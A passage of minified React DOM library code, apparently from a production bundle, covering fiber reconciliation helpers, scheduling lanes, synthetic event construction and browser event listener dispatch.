cs(e,t){if(t){if(ed[e]&&(t.children!=null||t.dangerouslySetInnerHTML!=null))throw Error(l(137,e));if(t.dangerouslySetInnerHTML!=null){if(t.children!=null)throw Error(l(60));if(typeof t.dangerouslySetInnerHTML!="object"||!("__html"in t.dangerouslySetInnerHTML))throw Error(l(61))}if(t.style!=null&&typeof t.style!="object")throw Error(l(62))}}function ds(e,t){if(e.indexOf("-")===-1)return typeof t.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var ps=null;function fs(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var hs=null,Tn=null,Pn=null;function Il(e){if(e=xr(e)){if(typeof hs!="function")throw Error(l(280));var t=e.stateNode;t&&(t=fi(t),hs(e.stateNode,e.type,t))}}function jl(e){Tn?Pn?Pn.push(e):Pn=[e]:Tn=e}function Ll(){if(Tn){var e=Tn,t=Pn;if(Pn=Tn=null,Il(e),t)for(e=0;e<t.length;e++)Il(t[e])}}function Nl(e,t){return e(t)}function zl(){}var ms=!1;function Dl(e,t,n){if(ms)return e(t,n);ms=!0;try{return Nl(e,t,n)}finally{ms=!1,(Tn!==null||Pn!==null)&&(zl(),Ll())}}function er(e,t){var n=e.stateNode;if(n===null)return null;var r=fi(n);if(r===null)return null;n=r[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(e=e.type,r=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!r;break e;default:e=!1}if(e)return null;if(n&&typeof n!="function")throw Error(l(231,t,typeof n));return n}var gs=!1;if(S)try{var tr={};Object.defineProperty(tr,"passive",{get:function(){gs=!0}}),window.addEventListener("test",tr,tr),window.removeEventListener("test",tr,tr)}catch{gs=!1}function td(e,t,n,r,i,s,u,p,f){var _=Array.prototype.slice.call(arguments,3);try{t.apply(n,_)}catch(A){this.onError(A)}}var nr=!1,qr=null,Vr=!1,ys=null,nd={onError:function(e){nr=!0,qr=e}};function rd(e,t,n,r,i,s,u,p,f){nr=!1,qr=null,td.apply(nd,arguments)}function id(e,t,n,r,i,s,u,p,f){if(rd.apply(this,arguments),nr){if(nr){var _=qr;nr=!1,qr=null}else throw Error(l(198));Vr||(Vr=!0,ys=_)}}function ln(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,(t.flags&4098)!==0&&(n=t.return),e=t.return;while(e)}return t.tag===3?n:null}function Ml(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Ol(e){if(ln(e)!==e)throw Error(l(188))}function sd(e){var t=e.alternate;if(!t){if(t=ln(e),t===null)throw Error(l(188));return t!==e?null:e}for(var n=e,r=t;;){var i=n.return;if(i===null)break;var s=i.alternate;if(s===null){if(r=i.return,r!==null){n=r;continue}break}if(i.child===s.child){for(s=i.child;s;){if(s===n)return Ol(i),e;if(s===r)return Ol(i),t;s=s.sibling}throw Error(l(188))}if(n.return!==r.return)n=i,r=s;else{for(var u=!1,p=i.child;p;){if(p===n){u=!0,n=i,r=s;break}if(p===r){u=!0,r=i,n=s;break}p=p.sibling}if(!u){for(p=s.child;p;){if(p===n){u=!0,n=s,r=i;break}if(p===r){u=!0,r=s,n=i;break}p=p.sibling}if(!u)throw Error(l(189))}}if(n.alternate!==r)throw Error(l(190))}if(n.tag!==3)throw Error(l(188));return n.stateNode.current===n?e:t}function $l(e){return e=sd(e),e!==null?Fl(e):null}function Fl(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var t=Fl(e);if(t!==null)return t;e=e.sibling}return null}var Bl=o.unstable_scheduleCallback,Ul=o.unstable_cancelCallback,od=o.unstable_shouldYield,ld=o.unstable_requestPaint,ke=o.unstable_now,ad=o.unstable_getCurrentPriorityLevel,vs=o.unstable_ImmediatePriority,Wl=o.unstable_UserBlockingPriority,Qr=o.unstable_NormalPriority,ud=o.unstable_LowPriority,Hl=o.unstable_IdlePriority,Kr=null,xt=null;function cd(e){if(xt&&typeof xt.onCommitFiberRoot=="function")try{xt.onCommitFiberRoot(Kr,e,void 0,(e.current.flags&128)===128)}catch{}}var ct=Math.clz32?Math.clz32:fd,dd=Math.log,pd=Math.LN2;function fd(e){return e>>>=0,e===0?32:31-(dd(e)/pd|0)|0}var Gr=64,Yr=4194304;function rr(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Xr(e,t){var n=e.pendingLanes;if(n===0)return 0;var r=0,i=e.suspendedLanes,s=e.pingedLanes,u=n&268435455;if(u!==0){var p=u&~i;p!==0?r=rr(p):(s&=u,s!==0&&(r=rr(s)))}else u=n&~i,u!==0?r=rr(u):s!==0&&(r=rr(s));if(r===0)return 0;if(t!==0&&t!==r&&(t&i)===0&&(i=r&-r,s=t&-t,i>=s||i===16&&(s&4194240)!==0))return t;if((r&4)!==0&&(r|=n&16),t=e.entangledLanes,t!==0)for(e=e.entanglements,t&=r;0<t;)n=31-ct(t),i=1<<n,r|=e[n],t&=~i;return r}function hd(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function md(e,t){for(var n=e.suspendedLanes,r=e.pingedLanes,i=e.expirationTimes,s=e.pendingLanes;0<s;){var u=31-ct(s),p=1<<u,f=i[u];f===-1?((p&n)===0||(p&r)!==0)&&(i[u]=hd(p,t)):f<=t&&(e.expiredLanes|=p),s&=~p}}function ks(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function ql(){var e=Gr;return Gr<<=1,(Gr&4194240)===0&&(Gr=64),e}function ws(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function ir(e,t,n){e.pendingLanes|=t,t!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,t=31-ct(t),e[t]=n}function gd(e,t){var n=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<n;){var i=31-ct(n),s=1<<i;t[i]=0,r[i]=-1,e[i]=-1,n&=~s}}function xs(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var r=31-ct(n),i=1<<r;i&t|e[r]&t&&(e[r]|=t),n&=~i}}var re=0;function Vl(e){return e&=-e,1<e?4<e?(e&268435455)!==0?16:536870912:4:1}var Ql,Ss,Kl,Gl,Yl,_s=!1,Zr=[],$t=null,Ft=null,Bt=null,sr=new Map,or=new Map,Ut=[],yd="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Xl(e,t){switch(e){case"focusin":case"focusout":$t=null;break;case"dragenter":case"dragleave":Ft=null;break;case"mouseover":case"mouseout":Bt=null;break;case"pointerover":case"pointerout":sr.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":or.delete(t.pointerId)}}function lr(e,t,n,r,i,s){return e===null||e.nativeEvent!==s?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:s,targetContainers:[i]},t!==null&&(t=xr(t),t!==null&&Ss(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,i!==null&&t.indexOf(i)===-1&&t.push(i),e)}function vd(e,t,n,r,i){switch(t){case"focusin":return $t=lr($t,e,t,n,r,i),!0;case"dragenter":return Ft=lr(Ft,e,t,n,r,i),!0;case"mouseover":return Bt=lr(Bt,e,t,n,r,i),!0;case"pointerover":var s=i.pointerId;return sr.set(s,lr(sr.get(s)||null,e,t,n,r,i)),!0;case"gotpointercapture":return s=i.pointerId,or.set(s,lr(or.get(s)||null,e,t,n,r,i)),!0}return!1}function Zl(e){var t=an(e.target);if(t!==null){var n=ln(t);if(n!==null){if(t=n.tag,t===13){if(t=Ml(n),t!==null){e.blockedOn=t,Yl(e.priority,function(){Kl(n)});return}}else if(t===3&&n.stateNode.current.memoizedState.isDehydrated){e.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Jr(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var n=Ts(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(n===null){n=e.nativeEvent;var r=new n.constructor(n.type,n);ps=r,n.target.dispatchEvent(r),ps=null}else return t=xr(n),t!==null&&Ss(t),e.blockedOn=n,!1;t.shift()}return!0}function Jl(e,t,n){Jr(e)&&n.delete(t)}function kd(){_s=!1,$t!==null&&Jr($t)&&($t=null),Ft!==null&&Jr(Ft)&&(Ft=null),Bt!==null&&Jr(Bt)&&(Bt=null),sr.forEach(Jl),or.forEach(Jl)}function ar(e,t){e.blockedOn===t&&(e.blockedOn=null,_s||(_s=!0,o.unstable_scheduleCallback(o.unstable_NormalPriority,kd)))}function ur(e){function t(i){return ar(i,e)}if(0<Zr.length){ar(Zr[0],e);for(var n=1;n<Zr.length;n++){var r=Zr[n];r.blockedOn===e&&(r.blockedOn=null)}}for($t!==null&&ar($t,e),Ft!==null&&ar(Ft,e),Bt!==null&&ar(Bt,e),sr.forEach(t),or.forEach(t),n=0;n<Ut.length;n++)r=Ut[n],r.blockedOn===e&&(r.blockedOn=null);for(;0<Ut.length&&(n=Ut[0],n.blockedOn===null);)Zl(n),n.blockedOn===null&&Ut.shift()}var Cn=Ee.ReactCurrentBatchConfig,ei=!0;function wd(e,t,n,r){var i=re,s=Cn.transition;Cn.transition=null;try{re=1,Es(e,t,n,r)}finally{re=i,Cn.transition=s}}function xd(e,t,n,r){var i=re,s=Cn.transition;Cn.transition=null;try{re=4,Es(e,t,n,r)}finally{re=i,Cn.transition=s}}function Es(e,t,n,r){if(ei){var i=Ts(e,t,n,r);if(i===null)Us(e,t,r,ti,n),Xl(e,r);else if(vd(i,e,t,n,r))r.stopPropagation();else if(Xl(e,r),t&4&&-1<yd.indexOf(e)){for(;i!==null;){var s=xr(i);if(s!==null&&Ql(s),s=Ts(e,t,n,r),s===null&&Us(e,t,r,ti,n),s===i)break;i=s}i!==null&&r.stopPropagation()}else Us(e,t,r,null,n)}}var ti=null;function Ts(e,t,n,r){if(ti=null,e=fs(r),e=an(e),e!==null)if(t=ln(e),t===null)e=null;else if(n=t.tag,n===13){if(e=Ml(t),e!==null)return e;e=null}else if(n===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return ti=e,null}function ea(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(ad()){case vs:return 1;case Wl:return 4;case Qr:case ud:return 16;case Hl:return 536870912;default:return 16}default:return 16}}var Wt=null,Ps=null,ni=null;function ta(){if(ni)return ni;var e,t=Ps,n=t.length,r,i="value"in Wt?Wt.value:Wt.textContent,s=i.length;for(e=0;e<n&&t[e]===i[e];e++);var u=n-e;for(r=1;r<=u&&t[n-r]===i[s-r];r++);return ni=i.slice(e,1<r?1-r:void 0)}function ri(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function ii(){return!0}function na(){return!1}function Xe(e){function t(n,r,i,s,u){this._reactName=n,this._targetInst=i,this.type=r,this.nativeEvent=s,this.target=u,this.currentTarget=null;for(var p in e)e.hasOwnProperty(p)&&(n=e[p],this[p]=n?n(s):s[p]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?ii:na,this.isPropagationStopped=na,this}return M(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=ii)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=ii)},persist:function(){},isPersistent:ii}),t}var bn={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Cs=Xe(bn),cr=M({},bn,{view:0,detail:0}),Sd=Xe(cr),bs,As,dr,si=M({},cr,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Is,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==dr&&(dr&&e.type==="mousemove"?(bs=e.screenX-dr.screenX,As=e.screenY-dr.screenY):As=bs=0,dr=e),bs)},movementY:function(e){return"movementY"in e?e.movementY:As}}),ra=Xe(si),_d=M({},si,{dataTransfer:0}),Ed=Xe(_d),Td=M({},cr,{relatedTarget:0}),Rs=Xe(Td),Pd=M({},bn,{animationName:0,elapsedTime:0,pseudoElement:0}),Cd=Xe(Pd),bd=M({},bn,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),Ad=Xe(bd),Rd=M({},bn,{data:0}),ia=Xe(Rd),Id={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},jd={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Ld={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Nd(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=Ld[e])?!!t[e]:!1}function Is(){return Nd}var zd=M({},cr,{key:function(e){if(e.key){var t=Id[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=ri(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?jd[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Is,charCode:function(e){return e.type==="keypress"?ri(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?ri(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Dd=Xe(zd),Md=M({},si,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),sa=Xe(Md),Od=M({},cr,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Is}),$d=Xe(Od),Fd=M({},bn,{propertyName:0,elapsedTime:0,pseudoElement:0}),Bd=Xe(Fd),Ud=M({},si,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Wd=Xe(Ud),Hd=[9,13,27,32],js=S&&"CompositionEvent"in window,pr=null;S&&"documentMode"in document&&(pr=document.documentMode);var qd=S&&"TextEvent"in window&&!pr,oa=S&&(!js||pr&&8<pr&&11>=pr),la=" ",aa=!1;function ua(e,t){switch(e){case"keyup":return Hd.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function ca(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var An=!1;function Vd(e,t){switch(e){case"compositionend":return ca(t);case"keypress":return t.which!==32?null:(aa=!0,la);case"textInput":return e=t.data,e===la&&aa?null:e;default:return null}}function Qd(e,t){if(An)return e==="compositionend"||!js&&ua(e,t)?(e=ta(),ni=Ps=Wt=null,An=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return oa&&t.locale!=="ko"?null:t.data;default:return null}}var Kd={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function da(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!Kd[e.type]:t==="textarea"}function pa(e,t,n,r){jl(r),t=ci(t,"onChange"),0<t.length&&(n=new Cs("onChange","change",null,n,r),e.push({event:n,listeners:t}))}var fr=null,hr=null;function Gd(e){Ra(e,0)}function oi(e){var t=Nn(e);if(wl(t))return e}function Yd(e,t){if(e==="change")return t}var fa=!1;if(S){var Ls;if(S){var Ns="oninput"in document;if(!Ns){var ha=document.createElement("div");ha.setAttribute("oninput","return;"),Ns=typeof ha.oninput=="function"}Ls=Ns}else Ls=!1;fa=Ls&&(!document.documentMode||9<document.documentMode)}function ma(){fr&&(fr.detachEvent("onpropertychange",ga),hr=fr=null)}function ga(e){if(e.propertyName==="value"&&oi(hr)){var t=[];pa(t,hr,e,fs(e)),Dl(Gd,t)}}function Xd(e,t,n){e==="focusin"?(ma(),fr=t,hr=n,fr.attachEvent("onpropertychange",ga)):e==="focusout"&&ma()}function Zd(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return oi(hr)}function Jd(e,t){if(e==="click")return oi(t)}function ep(e,t){if(e==="input"||e==="change")return oi(t)}function tp(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var dt=typeof Object.is=="function"?Object.is:tp;function mr(e,t){if(dt(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var i=n[r];if(!m.call(t,i)||!dt(e[i],t[i]))return!1}return!0}function ya(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function va(e,t){var n=ya(e);e=0;for(var r;n;){if(n.nodeType===3){if(r=e+n.textContent.length,e<=t&&r>=t)return{node:n,offset:t-e};e=r}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=ya(n)}}function ka(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?ka(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function wa(){for(var e=window,t=Wr();t instanceof e.HTMLIFrameElement;){try{var n=typeof t.contentWindow.location.href=="string"}catch{n=!1}if(n)e=t.contentWindow;else break;t=Wr(e.document)}return t}function zs(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}function np(e){var t=wa(),n=e.focusedElem,r=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&ka(n.ownerDocument.documentElement,n)){if(r!==null&&zs(n)){if(t=r.start,e=r.end,e===void 0&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if(e=(t=n.ownerDocument||document)&&t.defaultView||window,e.getSelection){e=e.getSelection();var i=n.textContent.length,s=Math.min(r.start,i);r=r.end===void 0?s:Math.min(r.end,i),!e.extend&&s>r&&(i=r,r=s,s=i),i=va(n,s);var u=va(n,r);i&&u&&(e.rangeCount!==1||e.anchorNode!==i.node||e.anchorOffset!==i.offset||e.focusNode!==u.node||e.focusOffset!==u.offset)&&(t=t.createRange(),t.setStart(i.node,i.offset),e.removeAllRanges(),s>r?(e.addRange(t),e.extend(u.node,u.offset)):(t.setEnd(u.node,u.offset),e.addRange(t)))}}for(t=[],e=n;e=e.parentNode;)e.nodeType===1&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<t.length;n++)e=t[n],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var rp=S&&"documentMode"in document&&11>=document.documentMode,Rn=null,Ds=null,gr=null,Ms=!1;function xa(e,t,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Ms||Rn==null||Rn!==Wr(r)||(r=Rn,"selectionStart"in r&&zs(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),gr&&mr(gr,r)||(gr=r,r=ci(Ds,"onSelect"),0<r.length&&(t=new Cs("onSelect","select",null,t,n),e.push({event:t,listeners:r}),t.target=Rn)))}function li(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var In={animationend:li("Animation","AnimationEnd"),animationiteration:li("Animation","AnimationIteration"),animationstart:li("Animation","AnimationStart"),transitionend:li("Transition","TransitionEnd")},Os={},Sa={};S&&(Sa=document.createElement("div").style,"AnimationEvent"in window||(delete In.animationend.animation,delete In.animationiteration.animation,delete In.animationstart.animation),"TransitionEvent"in window||delete In.transitionend.transition);function ai(e){if(Os[e])return Os[e];if(!In[e])return e;var t=In[e],n;for(n in t)if(t.hasOwnProperty(n)&&n in Sa)return Os[e]=t[n];return e}var _a=ai("animationend"),Ea=ai("animationiteration"),Ta=ai("animationstart"),Pa=ai("transitionend"),Ca=new Map,ba="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Ht(e,t){Ca.set(e,t),h(t,[e])}for(var $s=0;$s<ba.length;$s++){var Fs=ba[$s],ip=Fs.toLowerCase(),sp=Fs[0].toUpperCase()+Fs.slice(1);Ht(ip,"on"+sp)}Ht(_a,"onAnimationEnd"),Ht(Ea,"onAnimationIteration"),Ht(Ta,"onAnimationStart"),Ht("dblclick","onDoubleClick"),Ht("focusin","onFocus"),Ht("focusout","onBlur"),Ht(Pa,"onTransitionEnd"),w("onMouseEnter",["mouseout","mouseover"]),w("onMouseLeave",["mouseout","mouseover"]),w("onPointerEnter",["pointerout","pointerover"]),w("onPointerLeave",["pointerout","pointerover"]),h("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),h("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),h("onBeforeInput",["compositionend","keypress","textInput","paste"]),h("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),h("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),h("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var yr="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),op=new Set("cancel close invalid load scroll toggle".split(" ").concat(yr));function Aa(e,t,n){var r=e.type||"unknown-event";e.currentTarget=n,id(r,t,void 0,e),e.currentTarget=null}function Ra(e,t){t=(t&4)!==0;for(var n=0;n<e.length;n++){var r=e[n],i=r.event;r=r.listeners;e:{var s=void 0;if(t)for(var u=r.length-1;0<=u;u--){var p=r[u],f=p.instance,_=p.currentTarget;if(p=p.listener,f!==s&&i.isPropagationStopped())break e;Aa(i,p,_),s=f}else for(u=0;u<r.length;u++){if(p=r[u],f=p.instance,_=p.currentTarget,p=p.listener,f!==s&&i.isPropagationStopped())break e;Aa(i,p,_),s=f}}}if(Vr)throw e=ys,Vr=!1,ys=null,e}function ue(e,t){var n=t[Ks];n===void 0&&(n=t[Ks]=new Set);var r=e+"__bubble";n.has(r)||(Ia(t,e,2,!1),n.add(r))}function Bs(e,t,n){var r=0;t&&(r|=4),Ia(n,e,r,t)}var ui="_reactListening"+Math.random().toString(36).slice(2);function vr(e){if(!e[ui]){e[ui]=!0,d.forEach(function(n){n!=="selectionchange"&&(op.has(n)||Bs(n,!1,e),Bs(n,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[ui]||(t[ui]=!0,Bs("selectionchange",!1,t))}}function Ia(e,t,n,r){switch(ea(t)){case 1:var i=wd;break;case 4:i=xd;break;default:i=Es}n=i.bind(null,t,n,e),i=void 0,!gs||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(i=!0),r?i!==void 0?e.addEventListener(t,n,{capture:!0,passive:i}):e.addEventListener(t,n,!0):i!==void 0?e.addEventListener(t,n,{passive:i}):e.addEventListener(t,n,!1)}function Us(e,t,n,r,i){var s=r;if((t&1)===0&&(t&2)===0&&r!==null)e:for(;;){if(r===null)return;var u=r.tag;if(u===3||u===4){var p=r.stateNode.containerInfo;if(p===i||p.nodeType===8&&p.parentNode===i)break;if(u===4)for(u=r.return;u!==null;){var f=u.tag;if((f===3||f===4)&&(f=u.stateNode.containerInfo,f===i||f.nodeType===8&&f.parentNode===i))return;u=u.return}for(;p!==null;){if(u=an(p),u===null)return;if(f=u.tag,f===5||f===6){r=s=u;continue e}p=p.parentNode}}r=r.return}Dl(function(){var _=s,A=fs(n),R=[];e:{var C=Ca.get(e);if(C!==void 0){var z=Cs,O=e;switch(e){case"keypress":if(ri(n)===0)break e;case"keydown":case"keyup":z=Dd;break;case"focusin":O="focus",z=Rs;break;case"focusout":O="blur",z=Rs;break;case"beforeblur":case"afterblur":z=Rs;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":z=ra;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":z=Ed;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":z=$d;break;case _a:case Ea:case Ta:z=Cd;break;case Pa:z=Bd;break;case"scroll":z=Sd;break;case"wheel":z=Wd;break;case"copy":case"cut":case"paste":z=Ad;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":z=sa}var $=(t&4)!==0,we=!$&&e==="scroll",k=$?C!==null?C+"Capture":null:C;$=[];for(var g=_,x;g!==null;){x=g;var I=x.stateNode;if(x.tag===5&&I!==null&&(x=I,k!==null&&(I=er(g,k),I!=null&&$.push(kr(g,I,x)))),we)break;g=g.return}0<$.length&&(C=new z(C,O,null,n,A),R.push({event:C,listeners:$}))}}if((t&7)===0){e:{if(C=e==="mouseover"||e==="pointerover",z=e==="mouseout"||e==="pointerout",C&&n!==ps&&(O=n.relatedTarget||n.fromElement)&&(an(O)||O[At]))break 